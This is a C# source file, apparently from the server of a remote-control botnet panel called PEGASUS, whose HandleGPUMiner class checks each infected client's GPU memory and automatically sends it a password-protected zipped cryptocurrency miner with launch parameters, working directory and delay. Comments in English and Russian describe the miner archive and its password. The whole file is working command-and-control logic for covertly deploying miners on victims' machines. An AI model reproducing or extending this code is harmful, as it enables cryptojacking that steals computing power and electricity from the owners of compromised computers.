namespace Server.Handle_Packet
{
    using PEGASUS.Cryptografhsh;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using PEGASUS.Properties;
    using System.IO;
    using System.Threading;

    /// <summary>
    /// Defines the <see cref="HandleGPUMiner" />.
    /// </summary>
    internal class HandleGPUMiner
    {
        /// <summary>
        /// The ByteSend6.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        private void ByteSend6(Clients client)
        {
            MsgPack packet = new MsgPack();
            packet.ForcePathObject("Packet").AsString = "StartGPU";
            packet.ForcePathObject("PROCPHOENIX").AsString = Settings.Default.gpu6_Proc; //miner name in the archive without extension
            packet.ForcePathObject("ZIPPASSPHOENIX").AsString = Settings.Default.gpu6_zipPassword; // Archive password
            packet.ForcePathObject("PARMPHOENIX").AsString = Settings.Default.gpu6_Parametrs; // Launch parameters
            packet.ForcePathObject("WORKDIRPHOENIX").AsString = Settings.Default.gpu6_workDir; // Launch parameters
            packet.ForcePathObject("SYSWORKDIR").AsString = Settings.Default.gpu6_sysDir;
            packet.ForcePathObject("DELAY").AsString = Settings.Default.gpu6_delay.ToString();
            packet.ForcePathObject("IDPARAMETERS").AsString = Settings.Default.gpu_idParameters.ToString();
            packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(Settings.Default.gpu6_file)));
            ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
        }

        /// <summary>
        /// The ByteSend4.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        private void ByteSend4(Clients client)
        {
            MsgPack packet = new MsgPack();
            packet.ForcePathObject("Packet").AsString = "StartGPU";
            packet.ForcePathObject("PROCPHOENIX").AsString = Settings.Default.gpu4_Proc; //имя майнера в архиве без расширения
            packet.ForcePathObject("ZIPPASSPHOENIX").AsString = Settings.Default.gpu4_zipPassword; // Пароль от архива
            packet.ForcePathObject("PARMPHOENIX").AsString = Settings.Default.gpu4_Parametrs; // Параметры запуска
            packet.ForcePathObject("WORKDIRPHOENIX").AsString = Settings.Default.gpu4_workDir; // Параметры запуска
            packet.ForcePathObject("SYSWORKDIR").AsString = Settings.Default.gpu4_sysDir;
            packet.ForcePathObject("DELAY").AsString = Settings.Default.gpu4_delay.ToString();
            packet.ForcePathObject("IDPARAMETERS").AsString = Settings.Default.gpu_idParameters.ToString();
            packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(Settings.Default.gpu4_file)));
            ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
        }

        /// <summary>
        /// The GetGPU.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void GetGPU(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                int ramgpu = (int)unpack_msgpack.ForcePathObject("GPURAM").AsInteger;

                /*  if (unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString == "0" || unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString == "1")
                  {
                      // Если ID 0 то не запрашиваем авто-старт
                      client.LV.SubItems[10].BackColor = Color.IndianRed;
                  }
                */

                if (ramgpu >= 6)
                {
                    if (Settings.Default.autoStart_gpu6 == true)
                    {
                        if (Settings.Default.gpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString)
                        {
                            // ID Совпадают
                            return;
                        }
                        else
                        {
                            try
                            {
                                ByteSend6(client);
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    // Меньше
                    if (Settings.Default.autoStart_gpu4 == true)
                    {
                        if (Settings.Default.gpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString)
                        {
                            return;
                        }
                        else
                        {
                            try
                            {
                                ByteSend4(client);
                            }
                            catch
                            {
                                return;
                            }
                        }
                    }
                }
            }
            catch
            {
                return;
            }
        }
    }
}
